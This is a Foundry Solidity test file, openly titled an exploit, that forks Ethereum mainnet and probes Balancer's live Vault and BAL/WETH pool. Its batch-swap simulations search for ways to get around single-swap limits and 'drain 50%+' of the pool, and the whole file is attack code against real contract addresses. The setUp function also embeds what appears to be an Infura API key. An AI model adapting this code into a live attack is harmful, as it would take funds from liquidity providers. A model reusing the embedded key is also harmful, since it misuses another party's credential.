// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

// ============================================================================
// BATCH BYPASS EXPLOIT
// The batch of small swaps succeeds where single large swap fails
// Can we drain more tokens than should be possible?
// ============================================================================

interface IAsset {}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint256) external;
}

interface IVault {
    enum SwapKind { GIVEN_IN, GIVEN_OUT }

    struct BatchSwapStep {
        bytes32 poolId;
        uint256 assetInIndex;
        uint256 assetOutIndex;
        uint256 amount;
        bytes userData;
    }

    struct FundManagement {
        address sender;
        bool fromInternalBalance;
        address payable recipient;
        bool toInternalBalance;
    }

    function batchSwap(SwapKind kind, BatchSwapStep[] memory swaps, IAsset[] memory assets, FundManagement memory funds, int256[] memory limits, uint256 deadline) external payable returns (int256[] memory);
    function queryBatchSwap(SwapKind kind, BatchSwapStep[] memory swaps, IAsset[] memory assets, FundManagement memory funds) external returns (int256[] memory);
    function getPoolTokens(bytes32 poolId) external view returns (IERC20[] memory tokens, uint256[] memory balances, uint256 lastChangeBlock);
}

contract BalancerBatchBypass is Test {
    IVault constant VAULT = IVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IWETH constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 constant BAL = IERC20(0xba100000625a3754423978a60c9317c58a424e3D);

    bytes32 constant BAL_WETH_POOL = 0x5c6ee304399dbdb9c8ef030ab642b10820db8f56000200000000000000000014;

    address attacker;

    function setUp() public {
        vm.createSelectFork("https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c");
        attacker = address(this);
        vm.deal(attacker, 100000 ether);
        WETH.deposit{value: 50000 ether}();
        WETH.approve(address(VAULT), type(uint256).max);
        BAL.approve(address(VAULT), type(uint256).max);
    }

    // ========================================================================
    // TEST: Compare batch vs single swap - find maximum extraction
    // ========================================================================
    function test_BatchVsSingleMaxExtraction() public {
        console.log("=== BATCH VS SINGLE - MAXIMUM EXTRACTION ===");

        (,uint256[] memory poolBals,) = VAULT.getPoolTokens(BAL_WETH_POOL);
        uint256 poolBal = poolBals[0];
        uint256 poolWeth = poolBals[1];

        console.log("Pool BAL:", poolBal);
        console.log("Pool WETH:", poolWeth);

        IAsset[] memory assets = new IAsset[](2);
        assets[0] = IAsset(address(BAL));
        assets[1] = IAsset(address(WETH));

        IVault.FundManagement memory funds = IVault.FundManagement({
            sender: attacker,
            fromInternalBalance: false,
            recipient: payable(attacker),
            toInternalBalance: false
        });

        // Find maximum single swap
        uint256 maxSingleWeth = 0;
        uint256 maxSingleBal = 0;

        for (uint256 amt = 100 ether; amt <= 10000 ether; amt += 100 ether) {
            IVault.BatchSwapStep[] memory single = new IVault.BatchSwapStep[](1);
            single[0] = IVault.BatchSwapStep({
                poolId: BAL_WETH_POOL,
                assetInIndex: 1,
                assetOutIndex: 0,
                amount: amt,
                userData: ""
            });

            try VAULT.queryBatchSwap(IVault.SwapKind.GIVEN_IN, single, assets, funds) returns (int256[] memory d) {
                maxSingleWeth = amt;
                maxSingleBal = uint256(-d[0]);
            } catch {
                break;
            }
        }

        console.log("\nMax single swap:");
        console.log("  WETH in:", maxSingleWeth);
        console.log("  BAL out:", maxSingleBal);

        // Now test batch of same total amount
        uint256 batchCount = 100;
        uint256 perSwap = maxSingleWeth / batchCount;

        IVault.BatchSwapStep[] memory batch = new IVault.BatchSwapStep[](batchCount);
        for (uint i = 0; i < batchCount; i++) {
            batch[i] = IVault.BatchSwapStep({
                poolId: BAL_WETH_POOL,
                assetInIndex: 1,
                assetOutIndex: 0,
                amount: perSwap,
                userData: ""
            });
        }

        int256[] memory batchD = VAULT.queryBatchSwap(IVault.SwapKind.GIVEN_IN, batch, assets, funds);
        uint256 batchWethIn = uint256(batchD[1]);
        uint256 batchBalOut = uint256(-batchD[0]);

        console.log("\nBatch swap (100 swaps):");
        console.log("  WETH in:", batchWethIn);
        console.log("  BAL out:", batchBalOut);

        // Now try with MORE total WETH via batch
        console.log("\n=== TRYING TO EXCEED SINGLE SWAP LIMIT ===");

        uint256[] memory testAmounts = new uint256[](5);
        testAmounts[0] = maxSingleWeth * 2;
        testAmounts[1] = maxSingleWeth * 5;
        testAmounts[2] = maxSingleWeth * 10;
        testAmounts[3] = 10000 ether;
        testAmounts[4] = 20000 ether;

        for (uint t = 0; t < testAmounts.length; t++) {
            uint256 totalWeth = testAmounts[t];
            uint256 numSwaps = 200;
            uint256 amtEach = totalWeth / numSwaps;

            IVault.BatchSwapStep[] memory bigBatch = new IVault.BatchSwapStep[](numSwaps);
            for (uint i = 0; i < numSwaps; i++) {
                bigBatch[i] = IVault.BatchSwapStep({
                    poolId: BAL_WETH_POOL,
                    assetInIndex: 1,
                    assetOutIndex: 0,
                    amount: amtEach,
                    userData: ""
                });
            }

            try VAULT.queryBatchSwap(IVault.SwapKind.GIVEN_IN, bigBatch, assets, funds) returns (int256[] memory d) {
                console.log("\nTotal WETH:", totalWeth / 1e18);
                console.log("  BAL out:", uint256(-d[0]));
                console.log("  Effective rate:", uint256(-d[0]) * 1e18 / uint256(d[1]));
            } catch {
                console.log("\nTotal WETH:", totalWeth / 1e18, "-> FAILED");
            }
        }
    }

    // ========================================================================
    // TEST: Try to drain significant portion of pool via batch
    // ========================================================================
    function test_DrainPoolViaBatch() public {
        console.log("=== DRAIN POOL VIA BATCH ===");

        (,uint256[] memory poolBals,) = VAULT.getPoolTokens(BAL_WETH_POOL);
        uint256 poolBal = poolBals[0];

        console.log("Pool BAL:", poolBal);
        console.log("Target: Drain 50%+ of BAL");

        IAsset[] memory assets = new IAsset[](2);
        assets[0] = IAsset(address(BAL));
        assets[1] = IAsset(address(WETH));

        IVault.FundManagement memory funds = IVault.FundManagement({
            sender: attacker,
            fromInternalBalance: false,
            recipient: payable(attacker),
            toInternalBalance: false
        });

        // Try increasingly aggressive batch sizes
        uint256[] memory swapCounts = new uint256[](5);
        swapCounts[0] = 100;
        swapCounts[1] = 200;
        swapCounts[2] = 300;
        swapCounts[3] = 400;
        swapCounts[4] = 500;

        uint256 amtPerSwap = 50 ether;

        for (uint s = 0; s < swapCounts.length; s++) {
            uint256 numSwaps = swapCounts[s];

            IVault.BatchSwapStep[] memory drainSwaps = new IVault.BatchSwapStep[](numSwaps);
            for (uint i = 0; i < numSwaps; i++) {
                drainSwaps[i] = IVault.BatchSwapStep({
                    poolId: BAL_WETH_POOL,
                    assetInIndex: 1,
                    assetOutIndex: 0,
                    amount: amtPerSwap,
                    userData: ""
                });
            }

            try VAULT.queryBatchSwap(IVault.SwapKind.GIVEN_IN, drainSwaps, assets, funds) returns (int256[] memory d) {
                uint256 balExtracted = uint256(-d[0]);
                uint256 pctDrained = balExtracted * 100 / poolBal;

                console.log("Swaps count:", numSwaps);
                console.log("  BAL extracted:", balExtracted);
                console.log("  % of pool drained:", pctDrained);

                if (pctDrained >= 50) {
                    console.log("  !!! 50%+ DRAIN POSSIBLE !!!");
                }
            } catch {
                console.log("Swaps failed at count:", numSwaps);
            }
        }
    }

    // ========================================================================
    // TEST: Alternating direction batch - can we confuse accounting?
    // ========================================================================
    function test_AlternatingDirectionBatch() public {
        console.log("=== ALTERNATING DIRECTION BATCH ===");

        IAsset[] memory assets = new IAsset[](2);
        assets[0] = IAsset(address(BAL));
        assets[1] = IAsset(address(WETH));

        IVault.FundManagement memory funds = IVault.FundManagement({
            sender: attacker,
            fromInternalBalance: false,
            recipient: payable(attacker),
            toInternalBalance: false
        });

        // Create batch that alternates: WETH->BAL, BAL->WETH, WETH->BAL...
        // With decreasing amounts to see if rounding accumulates

        uint256 numPairs = 50;
        uint256 startAmount = 1 ether;

        IVault.BatchSwapStep[] memory altSwaps = new IVault.BatchSwapStep[](numPairs * 2);

        for (uint i = 0; i < numPairs; i++) {
            // WETH -> BAL
            altSwaps[i * 2] = IVault.BatchSwapStep({
                poolId: BAL_WETH_POOL,
                assetInIndex: 1,
                assetOutIndex: 0,
                amount: startAmount / (i + 1), // Decreasing amounts
                userData: ""
            });

            // BAL -> WETH (use 0 to use output from previous)
            altSwaps[i * 2 + 1] = IVault.BatchSwapStep({
                poolId: BAL_WETH_POOL,
                assetInIndex: 0,
                assetOutIndex: 1,
                amount: 0,
                userData: ""
            });
        }

        console.log("Testing", numPairs, "pairs of alternating swaps");

        try VAULT.queryBatchSwap(IVault.SwapKind.GIVEN_IN, altSwaps, assets, funds) returns (int256[] memory d) {
            console.log("Net WETH delta:", d[1]);
            console.log("Net BAL delta:", d[0]);

            // Negative delta means we're getting OUT
            if (d[1] < 0) {
                console.log("Net WETH OUT:", uint256(-d[1]));
            } else {
                console.log("Net WETH IN:", uint256(d[1]));
            }
        } catch Error(string memory reason) {
            console.log("Failed:", reason);
        } catch {
            console.log("Failed");
        }
    }

    // ========================================================================
    // TEST: Very small amounts in massive batch
    // ========================================================================
    function test_TinyAmountsMassiveBatch() public {
        console.log("=== TINY AMOUNTS MASSIVE BATCH ===");

        IAsset[] memory assets = new IAsset[](2);
        assets[0] = IAsset(address(BAL));
        assets[1] = IAsset(address(WETH));

        IVault.FundManagement memory funds = IVault.FundManagement({
            sender: attacker,
            fromInternalBalance: false,
            recipient: payable(attacker),
            toInternalBalance: false
        });

        // Try with tiny amounts but huge batch
        uint256 numSwaps = 500;
        uint256 tinyAmount = 1000000000; // 1 gwei

        IVault.BatchSwapStep[] memory tinySwaps = new IVault.BatchSwapStep[](numSwaps);
        for (uint i = 0; i < numSwaps; i++) {
            tinySwaps[i] = IVault.BatchSwapStep({
                poolId: BAL_WETH_POOL,
                assetInIndex: 1,
                assetOutIndex: 0,
                amount: tinyAmount,
                userData: ""
            });
        }

        console.log("500 swaps of 1 gwei each");
        console.log("Total WETH:", numSwaps * tinyAmount);

        int256[] memory d = VAULT.queryBatchSwap(IVault.SwapKind.GIVEN_IN, tinySwaps, assets, funds);
        uint256 totalWethIn = uint256(d[1]);
        uint256 totalBalOut = uint256(-d[0]);

        console.log("Results:");
        console.log("  Total WETH in:", totalWethIn);
        console.log("  Total BAL out:", totalBalOut);

        // Compare to single swap
        IVault.BatchSwapStep[] memory single = new IVault.BatchSwapStep[](1);
        single[0] = IVault.BatchSwapStep({
            poolId: BAL_WETH_POOL,
            assetInIndex: 1,
            assetOutIndex: 0,
            amount: numSwaps * tinyAmount,
            userData: ""
        });

        int256[] memory dSingle = VAULT.queryBatchSwap(IVault.SwapKind.GIVEN_IN, single, assets, funds);
        uint256 singleBalOut = uint256(-dSingle[0]);

        console.log("\nSingle swap of same total:");
        console.log("  BAL out:", singleBalOut);

        if (totalBalOut > singleBalOut) {
            console.log("\n!!! BATCH GIVES MORE !!!");
            console.log("Difference:", totalBalOut - singleBalOut);
        } else {
            console.log("\nSingle gives more by:", singleBalOut - totalBalOut);
        }
    }

    // ========================================================================
    // TEST: GIVEN_OUT batch - request specific amounts
    // ========================================================================
    function test_GivenOutBatchDrain() public {
        console.log("=== GIVEN_OUT BATCH DRAIN ===");

        (,uint256[] memory poolBals,) = VAULT.getPoolTokens(BAL_WETH_POOL);
        uint256 poolBal = poolBals[0];

        console.log("Pool BAL:", poolBal);

        IAsset[] memory assets = new IAsset[](2);
        assets[0] = IAsset(address(BAL));
        assets[1] = IAsset(address(WETH));

        IVault.FundManagement memory funds = IVault.FundManagement({
            sender: attacker,
            fromInternalBalance: false,
            recipient: payable(attacker),
            toInternalBalance: false
        });

        // Use GIVEN_OUT to request specific BAL amounts
        // Test if we can request more total via batch than via single

        uint256 requestPerSwap = poolBal / 100; // 1% per swap
        uint256 numSwaps = 50; // Request 50% total

        console.log("Requesting swaps:", numSwaps);
        console.log("Each swap requests % of pool:", requestPerSwap * 100 / poolBal);

        IVault.BatchSwapStep[] memory givenOutBatch = new IVault.BatchSwapStep[](numSwaps);
        for (uint i = 0; i < numSwaps; i++) {
            givenOutBatch[i] = IVault.BatchSwapStep({
                poolId: BAL_WETH_POOL,
                assetInIndex: 1, // WETH in
                assetOutIndex: 0, // BAL out
                amount: requestPerSwap, // BAL amount we want
                userData: ""
            });
        }

        try VAULT.queryBatchSwap(IVault.SwapKind.GIVEN_OUT, givenOutBatch, assets, funds) returns (int256[] memory d) {
            uint256 wethNeeded = uint256(d[1]);
            uint256 balRequested = numSwaps * requestPerSwap;

            console.log("GIVEN_OUT batch results:");
            console.log("  BAL requested:", balRequested);
            console.log("  WETH needed:", wethNeeded);
            console.log("  % of pool:", balRequested * 100 / poolBal);
        } catch {
            console.log("GIVEN_OUT batch FAILED");
        }

        // Compare to single GIVEN_OUT
        IVault.BatchSwapStep[] memory singleOut = new IVault.BatchSwapStep[](1);
        singleOut[0] = IVault.BatchSwapStep({
            poolId: BAL_WETH_POOL,
            assetInIndex: 1,
            assetOutIndex: 0,
            amount: numSwaps * requestPerSwap,
            userData: ""
        });

        try VAULT.queryBatchSwap(IVault.SwapKind.GIVEN_OUT, singleOut, assets, funds) returns (int256[] memory d) {
            console.log("\nSingle GIVEN_OUT for same amount:");
            console.log("  WETH needed:", uint256(d[1]));
        } catch {
            console.log("\nSingle GIVEN_OUT FAILED (over limit)");
            console.log("!!! BATCH BYPASSES SINGLE SWAP LIMIT !!!");
        }
    }

    receive() external payable {}
}
